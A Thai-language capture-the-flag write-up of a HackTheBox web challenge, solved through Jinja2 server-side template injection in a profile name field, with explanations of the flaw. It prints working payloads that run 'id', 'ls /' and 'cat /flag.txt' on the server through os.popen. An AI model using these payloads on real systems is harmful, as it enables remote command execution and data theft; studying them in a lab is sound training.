Hi, Can you speak Thai ?

Yes, I can speak Thai.

มา วันนี้เราจะมาทำข้อ JinjaCare หมวด Web ระดับ Very easy


Step 1 สร้างบัญชี
เขาจะให้ IP มา คือ 94.237.121.100:50594 จากนั้นเราก็เข้าไปที่ Sign In แล้วเลือก create a new account ในส่วนของข้อมูลที่ใช้สมัคร เราสามารถสมมติขึ้นมาเองได้เลย


Step 2 49

2.1 ไปที่ Personal Info ใส่วันเดือนปีเกิด ในส่วนนี้เราสามารถปลอมแปลงได้ 

2.2 ไปที่ Full Name เปลี่ยนข้อมูลจากชื่อเป็น {{7*7}} กด Save Changes

2.3 กลับไปที่ Dashboard กด Download Certificate

2.4 สังเกตตรง Name มันจะเป็น 49 ถ้าไม่ใช่ 49 ให้กลับไปดูตรง Full Name ในหน้า Personal Info ใหม่


Step 3 id
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution
```
นี่คือลิงก์เกี่ยวกับ Server Side Template Injection

3.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
```
{{7*7}}
```
เป็น
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
3.2 กลับไปที่ Dashboard กด Download Certificate

3.3 สังเกตตรง Name มันจะเปลี่ยนเป็น uid=0(root) gid=0(root) groups=0(root)


Step 4 ls

4.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 
```
เป็น 
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
```
4.2 สังเกตตรง Name มันจะเปลี่ยนเป็น app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var


Step 5 cat flag.txt

5.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
```
เป็น
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```
5.2 สังเกตตรง Name มันจะเปลี่ยนเป็น HTB{XXXXX}
XXXXX ไม่ใช้ flag นะ คือปิดไว้ จะได้ทำเอง

อธิบาย SSTI
- SSTI หรือ Server-Side Template Injection คือช่องโหว่ที่เกิดขึ้นเมื่อแอปพลิเคชันนำข้อมูลจากผู้ใช้ไปใส่ลงใน template ของฝั่งเซิร์ฟเวอร์โดยตรง ทำให้ข้อความนั้นถูกตีความหรือประมวลผลเป็นโค้ดของ template engine แทนที่จะเป็น "ข้อมูล" แบบนิ่ง (literal) ผลคือผู้โจมตีสามารถทำให้ template engine ประมวลผลนิพจน์ที่เขาส่งมาผ่านอินพุต และนั่นอาจนำไปสู่การเปิดเผยข้อมูลภายใน (ข้อมูลความลับ) หรือ การรันโค้ดบนเซิร์ฟเวอร์ (RCE) ขึ้นอยู่กับความสามารถของ engine
- Template engine คือ ซอฟต์แวร์ที่ช่วยให้นักพัฒนาเว็บสามารถแยกส่วนของโค้ด HTML ออกจากข้อมูลแบบไดนามิกได้ โดยจะประมวลผลเทมเพลตและแทนที่ตัวแปรต่างๆ ด้วยข้อมูลจริงก่อนที่จะสร้างเป็น HTML สุดท้าย การทำเช่นนี้ช่วยเพิ่มความสามารถในการอ่าน, นำโค้ดกลับมาใช้ใหม่, และจัดการโค้ดให้ง่ายขึ้น
- uid=0(root) gid=0(root) groups=0(root) มันหมายความว่า กระบวนการหรือเชลล์นั้นกำลังรันด้วยสิทธิ์ของผู้ใช้ root (ผู้ดูแลระบบ)
  อธิบายแต่ละส่วนแบบชัด ๆ
  uid=0(root) — UID (user identifier) = 0 ซึ่งตามมาตรฐานคือ ผู้ใช้ root (superuser)
  gid=0(root) — GID (group identifier) = 0 ซึ่งคือกลุ่ม root
  groups=0(root) — รายชื่อกลุ่มที่ผู้ใช้นั้นเป็นสมาชิก (ในที่นี้เป็นเพียงกลุ่ม root)
  ความหมายเชิงปฏิบัติ
  ถ้าคุณเห็นสตริงนี้สำหรับเชลล์หรือ process แปลว่า process นั้นมีสิทธิ์เต็ม (privileged) สามารถอ่านหรือเขียนไฟล์สำคัญของระบบ, เปลี่ยนการตั้งค่าระบบ, ติดตั้ง/ลบแพ็กเกจ, เปลี่ยนสิทธิ์ผู้ใช้ ฯลฯ โดยสรุปคือสามารถทำอะไรก็ได้บนเครื่อง (administrator powers)
  เป็นสถานะที่อันตรายถ้ากำลังรันโปรแกรมไม่เชื่อถืออยู่ใน context นี้ เพราะจะทำให้มัลแวร์หรือคำสั่งผิดพลาดทำความเสียหายได้มาก
- ถ้าแอปเอา "{{7*7}}" เข้าไปและ engine ประมวลเป็น 49 แปลว่าระบบตีความข้อมูลเป็นโค้ด นี่ไม่ใช่การปฏิบัติต่อข้อมูลแบบนิ่งและเสี่ยงเกิด SSTI

ศัพท์น่าสงสัย

"ข้อมูล" แบบนิ่ง (literal) คือ ค่าข้อมูลที่ถูกกำหนดไว้อย่างชัดเจนและคงที่ในโค้ดหรือเทมเพลตนั้น ๆ โดยตรง ไม่ใช่ค่าที่ได้จากการคำนวณ ตัวแปร หรือการดึงข้อมูลจากแหล่งภายนอก
ลักษณะของข้อมูลแบบนิ่ง (Literal Data) ข้อมูลแบบนิ่งจะถูกตีความตามที่เห็น โดยไม่ต้องมีการประมวลผลหรือค้นหาเพิ่มเติม มักเป็นประเภทข้อมูลพื้นฐาน เช่น Literal String, Literal Number เป็นต้น
ตัวอย่าง:

ลิงก์ข้อมูลเพิ่มเติม
1. Template engine
```
https://medium.com/@itz.dhruv/comprehensive-guide-to-template-engines-in-node-js-with-express-c953a47dfa9d
```
2. ChatGPT และ Gemini สามารถนำข้อมูลไปให้มันขยายความได้
